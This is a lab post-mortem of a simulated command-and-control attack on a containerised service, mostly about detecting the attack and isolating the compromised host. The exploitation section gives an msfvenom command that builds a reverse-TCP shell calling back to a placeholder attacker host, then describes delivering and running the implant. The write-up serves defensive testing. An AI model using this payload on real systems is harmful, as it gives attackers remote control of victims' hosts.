# Threat 2 — APT / Command-and-Control: PoC post-mortem

*Source for the C2 section of the report. Numbers from the clean run
`evidence/c2-20261121-122248/`; re-runnable with `threats/c2/run-c2.sh`.*

## What the threat is and why it is relevant

An Advanced Persistent Threat seeks durable control of a host after an
initial compromise, typically through a Command-and-Control (C2) channel that
lets the attacker operate the victim remotely. It is the post-compromise case
the perimeter cannot address: the attacker is already inside. In a
service-oriented architecture the danger is lateral — a single compromised
service host sits on the same network as every other service and the registry
that routes work to them, so one foothold threatens the whole system.

## How it is exploited

A Metasploit reverse-TCP payload is built with `msfvenom`, delivered to a
service container, and executed; the resulting shell connects back to the
attacker's handler, giving remote control. The victim is the **analytics**
service — chosen because it has a single identity (a clean deregistration
demonstration) and is non-critical, so isolating it does not break the
sensor → ingestion → storage pipeline. That the pipeline keeps running while
the compromised service is cut out is itself part of the demonstration.

Kill chain executed:

1. **Build** — `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker>
   LPORT=4444 -f elf`. A stageless payload was used after a staged
   meterpreter payload proved unreliable in the minimal container and too
   short-lived to be caught (see post-mortem notes).
2. **Deliver** — the payload is copied into `/opt/ssle/update-helper` on the
   victim. `/opt/ssle` is both a realistic implant location (beside the
   service binary) and exactly what file-integrity monitoring watches.
3. **Execute** — the victim runs the implant; a shell connects back to the
   handler. The attacker's console confirmed *"Command shell session 1
   opened (…:4444 → victim)"*.

## Metrics and monitoring

Three independent detections, so the compromise is caught even if one signal
is evaded:

| Signal | Rule | Fired | What it caught |
|--------|------|------:|----------------|
| File integrity | 100200 / 100201 | 8 | the implant appearing in `/opt/ssle` |
| Outbound C2 connection | 100213 (level 14) | 6 | the reverse shell to `:4444` |
| Persistence (cron/systemd) | 100202 | — | would fire had the attacker persisted |

The C2 connection is reported by `ssle-netwatch`, which lists every
established **outbound** connection and classifies any destination outside the
architecture's known ports as `UNEXPECTED`. Port 4444 (the Metasploit
default) raises the dedicated level-14 rule. The alert carried the correct
`srcip → dstip:dstport`, naming the victim, the attacker and the channel.

## Response adopted

Rule 100213 triggers the `ssle-isolate` active response, which does three
things in order of reversibility:

1. **Block the C2 channel** — an nftables rule drops traffic to the
   attacker's address. In the clean run the attacker address
   `10.255.255.160` was blocked on the victim within seconds of detection.
2. **Isolate at the application layer** — the service deregisters itself from
   the registry (`DELETE /unregister`), so discovery stops handing its
   address to other services. After the response, `discover(analytics)`
   returned **HTTP 404**: the compromised service was cut out of the
   architecture while the rest kept running.
3. **Preserve evidence** — a forensic snapshot (process tree, open
   connections, `/opt/ssle` listing, cron state) is written to
   `/var/log/ssle/incident-response.log` before anything is torn down. The
   snapshot captured the implant (`update-helper`, 194 bytes) and the C2
   shell process.

The response **isolates rather than kills**: the container is left intact and
running for investigation, cut off from both the attacker and the
architecture rather than destroyed.

## Post-mortem observations

- **Detection latency is real and bounded.** `ssle-netwatch` polls every 15
  seconds, so an attacker has up to that long with a live channel before
  isolation. A faster poll narrows the window but costs more overhead; this
  is an explicit trade-off, not an oversight.
- **A lingering socket is not a live channel.** After the block, the
  established socket still appeared in `ss` for a short time, because the
  nftables rule drops new packets rather than tearing the socket down. No
  traffic flows across it; the channel is severed even though the kernel has
  not yet reaped the socket. A more aggressive response could also kill the
  process, at the cost of forensic value.
- **Least privilege shaped the whole attack.** The runtime image ships **no
  compiler or toolchain**, so the payload had to arrive prebuilt; the service
  runs as the unprivileged `ssle` user under systemd hardening
  (`ProtectSystem=strict`, `NoNewPrivileges`). The attacker got a shell as an
  unprivileged user in a confined container, not root on the host.
- **Containment held throughout.** `lab-lockdown` kept the lab — and therefore
  all Metasploit traffic — off the internet for the duration, and the
  nftables guard kept the lab off the home LAN. The C2 channel existed only
  between two containers on the isolated `10.255.255.0/24` network.
- **Residual weakness.** Detection is behavioural (a connection to an
  unexpected port). An HTTPS C2 on 443 would blend with legitimate traffic by
  destination alone, so the netwatch signal would not flag it — recorded as
  counter-defence C1 in the C2 ADTree. Catching that needs beaconing
  analysis, which is out of scope here and a natural extension.

## Engineering notes (what did not work first)

Three failures were worked through, each a reusable lesson:

1. **Staged meterpreter was unreliable** in the minimal Debian container and
   exited before the 15 s netwatch poll. A stageless `shell_reverse_tcp`
   holds the connection open and is reliably caught.
2. **Wazuh agent command monitoring did not deliver** the netwatch output for
   analysis, although the rule matched the line in `wazuh-logtest`. The fix
   was to drive netwatch from a systemd timer that appends to a log file the
   agent tails — the same dependable path the access logs use.
3. **`msfconsole` would not run headless** — fed `/dev/null` it read EOF and
   exited, and backgrounding it with `incus exec … &` hung because incus
   waits for inherited descriptors to close. Running it as a transient
   `systemd-run` unit with `HOME=/root` and a `tail -f /dev/null` stdin solved
   both.

## Reproduction and cleanup

```
sudo lab-lockdown on                 # safety: cut lab egress first
bash threats/c2/run-c2.sh            # full cycle (~3 min)
bash threats/c2/run-c2.sh --cleanup  # restore victim, unlock egress
```

The victim is snapshotted as `analytics/pre-c2` before the run. After cleanup
the victim was verified healthy and re-registered (`discover(analytics)` →
HTTP 200, implant gone), and lab egress restored.
